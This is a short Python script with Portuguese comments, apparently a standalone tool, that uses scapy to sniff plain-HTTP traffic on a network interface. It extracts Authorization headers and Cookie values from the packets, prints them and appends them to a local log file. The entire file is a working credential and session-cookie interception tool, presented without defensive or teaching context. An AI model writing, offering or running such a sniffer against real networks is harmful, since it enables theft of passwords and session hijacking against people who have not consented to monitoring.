import threading
from scapy.all import sniff, TCP, Raw

print("\nCapturando Credenciais\n======================\n")

# Interface de rede para captura (por exemplo, 'eth0', 'wlan0')
interface = 'eth0'

# Filtro de captura para pacotes HTTP
capture_filter = 'tcp port 80'

# Variável global para controlar a captura
capturing = True

# Função para processar cada pacote capturado
def process_packet(packet):
    if TCP in packet and Raw in packet:
        payload = packet[Raw].load.decode(errors='ignore')
        if 'Authorization:' in payload:
            auth_info = payload.split('Authorization: ')[1].split('\r\n')[0]
            log_entry = f"Credenciais Encontradas: {auth_info}\n"
            print(log_entry.strip())
            with open('HTTP_log.txt', 'a') as log_file:
                log_file.write(log_entry)
        elif 'Cookie:' in payload:
            cookie_info = payload.split('Cookie: ')[1].split('\r\n')[0]
            log_entry = f"Cookie Encontrado: {cookie_info}\n"
            print(log_entry.strip())
            with open('HTTP_log.txt', 'a') as log_file:
                log_file.write(log_entry)
        # Adicione mais verificações conforme necessário

# Função para capturar pacotes
def capture_packets():
    global capturing
    sniff(iface=interface, filter=capture_filter, prn=lambda pkt: process_packet(pkt), stop_filter=lambda p: not capturing)

# Função para finalizar a captura
def wait_for_exit():
    global capturing
    capturing = False

# Inicia o thread para capturar pacotes
capture_thread = threading.Thread(target=capture_packets)
capture_thread.start()

# Espera o thread de captura terminar
capture_thread.join()

print("\nCaptura Encerrada.")
